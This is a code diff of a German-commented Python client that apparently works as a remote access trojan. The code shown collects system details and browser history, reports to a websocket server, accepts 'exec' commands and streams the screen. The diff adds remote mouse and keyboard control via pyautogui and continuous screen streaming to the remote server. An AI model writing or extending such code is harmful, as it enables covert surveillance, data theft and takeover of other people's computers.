@@ -76,7 +76,7 @@ def send_ntfy_notification():
 def get_system_info():
     try:
         info = {
-            "Benutzer": os.getlogin(),
+            "Benutzer": os.getlogin() if hasattr(os, "getlogin") else "Unbekannt",
             "Hostname": socket.gethostname(),
             "OS": platform.platform(),
             "Öffentliche IP": get_public_ip(),
@@ -307,12 +307,53 @@ def get_browser_history(limit=50):
     
     return "\n".join(output) if output else "Keine Browserverläufe gefunden."
 
-# --- Screen Streaming ---
+# --- Fernsteuerung via pyautogui ---
+def handle_pyautogui_control(cmd: dict):
+    import pyautogui
+    action = cmd.get("control_action")
+    try:
+        if action == "move":
+            x, y = cmd.get("x"), cmd.get("y")
+            pyautogui.moveTo(x, y)
+        elif action == "click":
+            x, y = cmd.get("x"), cmd.get("y")
+            button = cmd.get("button", "left")
+            pyautogui.click(x, y, button=button)
+        elif action == "mousedown":
+            x, y = cmd.get("x"), cmd.get("y")
+            button = cmd.get("button", "left")
+            pyautogui.mouseDown(x, y, button=button)
+        elif action == "mouseup":
+            x, y = cmd.get("x"), cmd.get("y")
+            button = cmd.get("button", "left")
+            pyautogui.mouseUp(x, y, button=button)
+        elif action == "scroll":
+            clicks = cmd.get("clicks", 0)
+            pyautogui.scroll(clicks)
+        elif action == "keypress":
+            key = cmd.get("key")
+            pyautogui.press(key)
+        elif action == "keydown":
+            key = cmd.get("key")
+            pyautogui.keyDown(key)
+        elif action == "keyup":
+            key = cmd.get("key")
+            pyautogui.keyUp(key)
+        elif action == "type":
+            text = cmd.get("text", "")
+            pyautogui.typewrite(text)
+        # Add more actions as needed
+        return {"status": "ok"}
+    except Exception as e:
+        return {"status": "error", "error": str(e)}
+
+# --- Screen Streaming (VNC-Style) ---
 class ScreenStreamer:
     def __init__(self):
         self._task = None
         self._running = False
-        self._fps = 10  # Ziel-FPS für Streaming
+        self._fps = 10
+        self._ws = None
 
     async def start(self, ws):
         if self._running:
@@ -320,7 +361,8 @@ class ScreenStreamer:
             return
         print("[ScreenStreamer] Starte Streaming.")
         self._running = True
-        self._task = asyncio.create_task(self._stream(ws))
+        self._ws = ws
+        self._task = asyncio.create_task(self._stream())
 
     async def stop(self):
         self._running = False
@@ -335,12 +377,10 @@ class ScreenStreamer:
             self._task = None
         print("[ScreenStreamer] Gestoppt.")
 
-    async def _stream(self, ws):
-        import asyncio
+    async def _stream(self):
         import mss
         from PIL import Image
         import io
-
         sct = mss.mss()
         monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
         max_width, max_height = 1280, 720
@@ -348,7 +388,6 @@ class ScreenStreamer:
             while self._running:
                 img = sct.grab(monitor)
                 im = Image.frombytes('RGB', (img.width, img.height), img.rgb)
-                # Adaptive Resize
                 if img.width > max_width or img.height > max_height:
                     im.thumbnail((max_width, max_height), Image.LANCZOS)
                 buf = io.BytesIO()
@@ -360,11 +399,8 @@ class ScreenStreamer:
                     'height': im.height
                 }
                 try:
-                    # Sende zuerst das Metaobjekt als JSON-Text
-                    await ws.send(json.dumps(meta))
-                    # Dann das Bild als Binärdaten
-                    await ws.send(img_bytes)
-                    print(f"[ScreenStreamer] Frame gesendet ({im.width}x{im.height}, {len(img_bytes)//1024}KB)")
+                    await self._ws.send(json.dumps(meta))
+                    await self._ws.send(img_bytes)
                 except Exception as e:
                     print(f"[ScreenStreamer] Fehler beim Senden: {e}")
                     break
@@ -378,6 +414,7 @@ screen_streamer = ScreenStreamer()
 
 # --- Hauptlogik ---
 async def process_commands(websocket):
+    # VNC-Style: Screenstream bleibt aktiv, solange gestartet
     while True:
         try:
             message = await websocket.recv()
@@ -403,7 +440,11 @@ async def process_commands(websocket):
                 await websocket.send(json.dumps(response))
                 continue
             elif action == "control":
-                await handle_control(command)
+                # Fernsteuerung via pyautogui
+                ctrl_result = handle_pyautogui_control(command)
+                response.update(ctrl_result)
+                response["type"] = "command_output"
+                await websocket.send(json.dumps(response))
                 continue
 
             if action == "exec":
@@ -519,8 +560,8 @@ async def connect_to_server():
                         "ip": get_public_ip(),
                         "output": sysinfo,
                     }))
-                except Exception:
-                    pass
+                except Exception as e:
+                    logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
 
                 await process_commands(websocket)
         except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
